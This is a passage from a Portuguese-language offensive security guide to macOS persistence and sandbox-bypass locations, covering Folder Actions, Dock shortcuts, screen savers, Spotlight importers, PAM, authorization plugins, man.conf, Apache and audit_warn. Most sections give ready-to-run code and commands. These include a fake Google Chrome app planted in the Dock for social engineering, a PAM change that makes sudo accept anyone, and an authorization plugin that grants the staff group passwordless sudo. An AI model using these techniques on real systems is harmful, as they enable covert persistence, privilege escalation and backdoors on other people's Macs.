-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
O nome do arquivo contém a fila, o número do job e o horário em que ele está programado para ser executado. Por exemplo, vamos analisar `a0001a019bdcd2`.

- `a` - esta é a fila
- `0001a` - número do job em hexadecimal, `0x1a = 26`
- `019bdcd2` - horário em hexadecimal. Ele representa os minutos decorridos desde o epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que corresponde a `GMT: 27 de abril de 2021, terça-feira, 7:46:00`.

Se imprimirmos o arquivo do job, descobriremos que ele contém as mesmas informações obtidas usando `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Porém, é necessário conseguir chamar `osascript` com argumentos para entrar em contato com **`System Events`** e configurar Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ele possui algumas permissões básicas de TCC, como Desktop, Documents e Downloads

#### Localização

- **`/Library/Scripts/Folder Action Scripts`**
- Root necessário
- **Trigger**: acesso à pasta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: acesso à pasta especificada

#### Descrição e Exploitation

Folder Actions são scripts acionados automaticamente por alterações em uma pasta, como adicionar ou remover itens, ou por outras ações, como abrir ou redimensionar a janela da pasta. Essas ações podem ser utilizadas para várias tarefas e podem ser acionadas de diferentes formas, como pela interface do Finder ou por comandos do terminal.

Para configurar Folder Actions, você tem opções como:

1. Criar um workflow de Folder Action com o [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalá-lo como um serviço.
2. Anexar um script manualmente usando o Folder Actions Setup no menu de contexto de uma pasta.
3. Utilizar OSAScript para enviar mensagens Apple Event ao `System Events.app` e configurar programaticamente uma Folder Action.
- Esse método é particularmente útil para incorporar a action ao sistema, oferecendo um nível de persistência.

O script a seguir é um exemplo do que pode ser executado por uma Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para tornar o script acima utilizável pelas Folder Actions, compile-o usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Depois que o script for compilado, configure as Folder Actions executando o script abaixo. Esse script habilitará as Folder Actions globalmente e associará especificamente o script compilado anteriormente à pasta Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Execute o script de configuração com:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Esta é a forma de implementar essa persistência via GUI:

Este é o script que será executado:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compile-o com: `osacompile -l JavaScript -o folder.scpt source.js`

Mova-o para:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Em seguida, abra o aplicativo `Folder Actions Setup`, selecione a **pasta que você deseja monitorar** e, no seu caso, selecione **`folder.scpt`** (no meu caso, eu o chamei de output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, em formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` como backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Folder Actions que você acabou de configurar:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio:

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o Folder Actions Setup.app para carregar essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E isso não funcionou para mim, mas estas são as instruções do writeup:(

### Atalhos do Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa ter instalado um aplicativo malicioso dentro do sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: quando o usuário clica no aplicativo dentro do Dock

#### Descrição e Exploitation

Todos os aplicativos que aparecem no Dock são especificados dentro do plist: **`~/Library/Preferences/com.apple.dock.plist`**

É possível **adicionar um aplicativo** simplesmente com:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Usando alguma **engenharia social**, você poderia **personificar, por exemplo, o Google Chrome** dentro do dock e executar efetivamente seu próprio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Seletores de cores

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Uma ação muito específica precisa acontecer
- Você terminará em outro sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/Library/ColorPickers`
- Root necessário
- Gatilho: usar o seletor de cores
- `~/Library/ColorPickers`
- Gatilho: usar o seletor de cores

#### Descrição e Exploit

**Compile** um bundle de seletor de cores com seu código (você poderia usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um constructor (como na [seção Screen Saver](macos-auto-start-locations.md#screen-saver)), depois copie o bundle para `~/Library/ColorPickers`.

Então, quando o seletor de cores for acionado, seu código também deverá ser executado.

Observe que o binário que carrega sua library possui um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Útil para bypass do sandbox: **Não, porque você precisa executar seu próprio app**
- Bypass do TCC: ???

#### Localização

- Um app específico

#### Descrição e Exploit

Um exemplo de aplicação com uma Finder Sync Extension [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

As aplicações podem ter `Finder Sync Extensions`. Essa extensão ficará dentro de uma aplicação que será executada. Além disso, para que a extensão possa executar seu código, ela **deve estar assinada** com algum certificado válido de developer da Apple, deve estar **sandboxed** (embora exceções mais permissivas possam ser adicionadas) e deve ser registrada com algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Protetor de Tela

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Porém, você acabará em um sandbox de aplicação comum
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/System/Library/Screen Savers`
- Root required
- **Gatilho**: Selecione o protetor de tela
- `/Library/Screen Savers`
- Root required
- **Gatilho**: Selecione o protetor de tela
- `~/Library/Screen Savers`
- **Gatilho**: Selecione o protetor de tela

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição e Exploit

Crie um novo projeto no Xcode e selecione o template para gerar um novo **Screen Saver**. Em seguida, adicione seu código a ele, por exemplo, o código a seguir para gerar logs.

Faça o **Build** e copie o bundle `.saver` para **`~/Library/Screen Savers`**. Depois, abra a GUI do protetor de tela e, se você simplesmente clicar nele, muitos logs deverão ser gerados:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Observe que, como dentro dos entitlements do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) você pode encontrar **`com.apple.security.app-sandbox`**, estará **dentro do sandbox comum da aplicação**.

Código do Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins do Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você acabará em um application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- O sandbox parece muito limitado

#### Localização

- `~/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- `/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
- New app required

#### Descrição e Exploitation

O Spotlight é o recurso de busca integrado do macOS, desenvolvido para fornecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
Para permitir essa capacidade de busca rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice ao **analisar a maioria dos arquivos**, possibilitando buscas rápidas tanto pelos nomes dos arquivos quanto pelo seu conteúdo.

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'.** Esse processo coordena todo o serviço do Spotlight. Complementando-o, existem vários daemons 'mdworker' que executam diversas tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis graças aos plugins importadores do Spotlight, ou **".mdimporter bundles**", que permitem ao Spotlight compreender e indexar conteúdo em uma ampla variedade de formatos de arquivo.

Os plugins ou bundles **`.mdimporter`** estão localizados nos locais mencionados anteriormente e, se um novo bundle aparecer, ele será carregado em um minuto (não é necessário reiniciar nenhum serviço). Esses bundles precisam indicar **quais tipos e extensões de arquivo conseguem gerenciar**; dessa forma, o Spotlight os utilizará quando um novo arquivo com a extensão indicada for criado.

É possível **encontrar todos os `mdimporters`** carregados executando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E, por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar estes tipos de arquivos (entre outras, as extensões `.iba` e `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se você verificar o Plist de outro `mdimporter`, talvez não encontre a entrada **`UTTypeConformsTo`**. Isso ocorre porque esse é um _Uniform Type Identifier_ integrado ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) e não precisa especificar extensões.
>
> Além disso, os plugins padrão do sistema sempre têm precedência, portanto um atacante só pode acessar arquivos que não sejam indexados pelos próprios `mdimporters` da Apple.

Para criar seu próprio importer, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), alterar o nome e o **`CFBundleDocumentTypes`**, além de adicionar **`UTImportedTypeDeclarations`**, para que ele ofereça suporte à extensão desejada, e refleti-las em **`schema.xml`**.\
Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar seu payload quando um arquivo com a extensão processada for criado.

Por fim, **compile e copie seu novo `.mdimporter`** para uma das três localizações anteriores. Você pode verificar quando ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**

### ~~Painel de Preferências~~

> [!CAUTION]
> Não parece que isso ainda esteja funcionando.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Requer uma ação específica do usuário
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrição

Não parece que isso ainda esteja funcionando.

## Bypass de Root Sandbox

> [!TIP]
> Aqui você pode encontrar localizações de inicialização úteis para **sandbox bypass**, que permitem simplesmente executar algo **escrevendo-o em um arquivo** como **root** e/ou exigindo outras **condições estranhas.**

### Periódico

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas é necessário ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root necessário
- **Trigger**: Quando chegar o momento
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
- Root necessário
- **Trigger**: Quando chegar o momento

#### Descrição e Exploitation

Os scripts periódicos (**`/etc/periodic`**) são executados por causa dos **launch daemons** configurados em `/System/Library/LaunchDaemons/com.apple.periodic*`. Observe que os scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo,** portanto isso não funcionará para uma possível privilege escalation.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Há outros scripts periódicos que serão executados, indicados em **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se você conseguir escrever qualquer um dos arquivos `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, ele será **executado mais cedo ou mais tarde**.

> [!WARNING]
> Observe que o script periódico será **executado como o proprietário do script**. Portanto, se um usuário comum for o proprietário do script, ele será executado como esse usuário (isso pode impedir ataques de escalação de privilégios).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Root sempre necessário

#### Descrição & Exploração

Como o PAM é mais focado em **persistência** e malware do que em execução fácil dentro do macOS, este blog não fornecerá uma explicação detalhada; **leia os writeups para entender melhor esta técnica**.

Verifique os módulos PAM com:
```bash
ls -l /etc/pam.d
```
Uma técnica de persistência/escalada de privilégios que abusa do PAM é tão simples quanto modificar o módulo `/etc/pam.d/sudo`, adicionando no início a linha:
```bash
auth       sufficient     pam_permit.so
```
Então, ficará **parecido** com algo assim:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

> [!CAUTION]
> Observe que este diretório é protegido pelo TCC, portanto é altamente provável que o usuário receba um prompt solicitando acesso.

Outro bom exemplo é o su, em que você pode ver que também é possível fornecer parâmetros aos módulos PAM (e você também poderia fazer backdoor neste arquivo):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins de Autorização

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Útil para fazer bypass do sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e fazer configurações adicionais
- TCC bypass: ???

#### Localização

- `/Library/Security/SecurityAgentPlugins/`
- É necessário ser root
- Também é necessário configurar o authorization database para usar o plugin

#### Descrição e Exploitation

Você pode criar um authorization plugin que será executado quando um usuário fizer login para manter a persistência. Para obter mais informações sobre como criar um desses plugins, consulte os writeups anteriores (e tenha cuidado: um plugin mal escrito pode bloquear seu acesso, e você precisará limpar seu Mac a partir do recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mova** o bundle para o local onde será carregado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Por fim, adicione a **rule** para carregar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
O **`evaluate-mechanisms`** informará ao framework de autorização que será necessário **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que ele seja executado pelo root.

Acione-o com:
```bash
security authorize com.asdf.asdf
```
E então o **staff group deve ter acesso sudo** (leia `/etc/sudoers` para confirmar).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e o usuário deve usar man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root required
- **`/private/etc/man.conf`**: Sempre que man é usado

#### Description & Exploit

O arquivo de configuração **`/private/etc/man.conf`** indica o binary/script a ser usado ao abrir arquivos de documentação do man. Portanto, o path para o executável poderia ser modificado para que, sempre que o usuário use man para ler alguma documentação, um backdoor seja executado.

Por exemplo, defina em **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E então crie `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e o apache precisa estar em execução
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd não possui entitlements

#### Localização

- **`/etc/apache2/httpd.conf`**
- Requer root
- Gatilho: Quando o Apache2 é iniciado

#### Descrição e Exploit

Você pode indicar em `/etc/apache2/httpd.conf` o carregamento de um módulo adicionando uma linha como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Dessa forma, seu módulo compilado será carregado pelo Apache. A única coisa é que você precisa **assiná-lo com um certificado Apple válido** ou **adicionar um novo certificado confiável** ao sistema e **assiná-lo** com esse certificado.

Então, se necessário, para garantir que o servidor seja iniciado, você poderia executar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemplo de código para o Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Framework de auditoria BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root, o auditd precisa estar em execução e uma advertência deve ser gerada
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/etc/security/audit_warn`**
- É necessário ser root
- **Gatilho**: Quando o auditd detecta uma advertência

#### Descrição e Exploit

Sempre que o auditd detecta uma advertência, o script **`/etc/security/audit_warn`** é **executado**. Portanto, você poderia adicionar seu payload a ele.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Você poderia forçar um aviso com `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Isso está obsoleto, portanto nada deve ser encontrado nesses diretórios.**

O **StartupItem** é um diretório que deve estar localizado em `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Depois que esse diretório for criado, ele deverá conter dois arquivos específicos:

1. Um **rc script**: um shell script executado na inicialização.
2. Um **plist file**, especificamente denominado `StartupParameters.plist`, que contém várias configurações.

Certifique-se de que tanto o rc script quanto o arquivo `StartupParameters.plist` estejam corretamente colocados dentro do diretório **StartupItem** para que o processo de inicialização possa reconhecê-los e utilizá-los.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Não consigo encontrar este componente no meu macOS; para obter mais informações, consulte o writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduzido pela Apple, o **emond** é um mecanismo de logging que parece estar subdesenvolvido ou possivelmente abandonado, mas ainda permanece acessível. Embora não seja particularmente útil para um administrador de Mac, esse serviço obscuro poderia servir como um método sutil de persistência para threat actors, provavelmente passando despercebido pela maioria dos administradores de macOS.

Para aqueles que têm conhecimento de sua existência, identificar qualquer uso malicioso do **emond** é simples. O LaunchDaemon do sistema para esse serviço procura scripts para executar em um único diretório. Para inspecioná-lo, o seguinte comando pode ser usado:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Localização

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Requer root
- **Gatilho**: Com XQuartz

